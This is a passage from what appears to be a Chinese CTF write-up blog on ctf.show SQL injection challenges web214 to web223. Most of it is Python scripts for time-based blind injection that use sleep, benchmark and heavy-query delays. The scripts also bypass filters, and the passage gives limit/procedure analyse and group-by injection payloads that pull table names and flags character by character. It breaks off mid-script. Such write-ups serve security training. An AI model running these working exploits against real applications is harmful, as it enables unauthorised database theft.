punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)"</span></span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h4><p>使用单引号闭合，后面使用<code>#</code>或者闭合</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1959b6f7-1317-4f83-a586-f487063f8d90.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaa,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaa from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1) and '1'='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web216-to-base64"><a href="#web216-to-base64" class="headerlink" title="web216(to_base64)"></a>web216(to_base64)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select id from ctfshow_info where ip &#x3D; from_base64(127.0.0.1);</code></pre><p>将Payload进行base64编码并闭合即可</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://7d8b8dba-70c3-4c4e-8065-f936f72d0187.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxcc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxcc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"'MQ==') or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web217-benchmark"><a href="#web217-benchmark" class="headerlink" title="web217(benchmark)"></a>web217(benchmark)</h4><p><code>sleep</code>被ban了</p><p><a href="https://www.cnblogs.com/c1e4r/articles/9060525.html">sql时间盲注另外两种方式(benchmark,heavy query)</a></p><p><strong>benchmark()</strong></p><p>benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select BENCHMARK(10000,md5(&#39;a&#39;));+---------------------------+| BENCHMARK(10000,md5(&#39;a&#39;)) |+---------------------------+|                         0 |+---------------------------+1 row in set (0.00 sec)mysql&gt; select BENCHMARK(1000000,md5(&#39;a&#39;));+-----------------------------+| BENCHMARK(1000000,md5(&#39;a&#39;)) |+-----------------------------+|                           0 |+-----------------------------+1 row in set (0.33 sec)mysql&gt; select BENCHMARK(10000000,md5(&#39;a&#39;));+------------------------------+| BENCHMARK(10000000,md5(&#39;a&#39;)) |+------------------------------+|                            0 |+------------------------------+1 row in set (2.93 sec)</code></pre><p>可以看到,执行不同的次数那么执行的时间也就不一样，通过这个函数我们可以达到与sleep()同样的延时目的。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">ip&#x3D;1) and if(2&gt;1,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1&amp;debug&#x3D;1</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://92f2c52d-9e13-4d63-8711-5eea7dcd5ac4.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">30</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxccb,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxccb"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,benchmark(700000,md5(1)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h4><p><code>benchmark</code>被ban了</p><p>还有一种方法 使用查询语句 查询大量数据从而消耗时间</p><p>本地先演示一次 users一共六条数据 最终会有36条数据 6*6&#x3D;36 form后 如果是逗号 会进行排列组合 如果表足够大那么查询的数据也就相</p><p>当大（原理不用理解 记住这么用能查询大量数据即可）该方式叫笛卡尔积</p><p><img src="web218.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://2ba8df77-69bf-43d4-99e0-b2689ef71af6.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">7</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token comment"># ctfshow&#123;f470e6gb-3856-42D3-ae55-402e84412f0P&#125;</span><span class="token comment"># ctfshow&#123;f47hc6hb-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c7dh-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c6db-3856-4293-ae55-402e84412f04&#125; √</span></code></pre><h4 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h4><p>多屏蔽了一个rlike（也是延时的一种方法） 上一题脚本依旧可以</p><h4 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h4><p>过滤了substr 那就使用left即可 并且过滤了concat 导致我们group_concat 不 能使用 但是可以是用limit 逐行获取</p><p><strong>limit N,M</strong> : 相当于 <strong>limit M offset N</strong> , 从第 N 条记录开始, 返回 M 条记录</p><p>另外ascii也被ban了，所以直接比较字符串</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://83d3e450-cfe1-4e34-9769-2021e662fa03.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagdic <span class="token operator">=</span> <span class="token string">"1234567890-_&#123;&#125;qwertyuioplkjhgfdsazxcvbnm, "</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagdic<span class="token punctuation">:</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxcac,ctfshow_info</span>        <span class="token comment"># payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"</span>        <span class="token comment"># 查列名  id,flagaabcc,info</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabcc from ctfshow_flagxcac"</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(left((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">',(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web221-limit注入"><a href="#web221-limit注入" class="headerlink" title="web221(limit注入)"></a>web221(limit注入)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span>    </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:很安全，不需要过滤</span><span class="token comment">//拿到数据库名字就算你赢</span>      </code></pre><p>1）<strong>limit前面没有order by时，后面可以跟union，如果存在order by，则不能使用union。</strong></p><p>2）limit后面不能直接跟select语句和if语句。<strong>可以跟procedure语句，值得注意的是只有在5.0.0&lt; MySQL &lt;5.6.6版本才可以使用，procedure后面支持报错注入以及时间盲注</strong></p><p>3）limit 关键字后面还可跟PROCEDURE和 INTO两个关键字，但是 INTO 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难。</p><p><a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html">PROCEDURE ANALYZE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?page&#x3D;1&amp;limit&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</code></pre><p><img src="web221.png" loading="lazy"></p><h4 id="web222-group注入"><a href="#web222-group注入" class="headerlink" title="web222(group注入)"></a>web222(group注入)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group <span class="token class-name type-declaration">by</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    </code></pre><p><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html#1869274163">group by注入原理</a></p><p>延时盲注，例如</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">group by if(1&#x3D;1,sleep(1),1)</code></pre><blockquote><p>但要注意的是，group by会向下一直查询，数据库里总共有21条数据，如果我们是sleep(0.05)则是停顿1.05秒</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://cfb15639-dd8d-4146-a2c1-5b6e2e349162.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flaga,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat((if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(0.05), 2)),1);"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h4><p>group by 位置注入，和上一题差不多，不过这次再尝试会发现禁用了数字，改用 true 构造数字。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">'true'</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>        <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">"https://9fb07532-bf0d-4e1c-b4aa-241e19c88933.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagas,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagasabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"(if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span 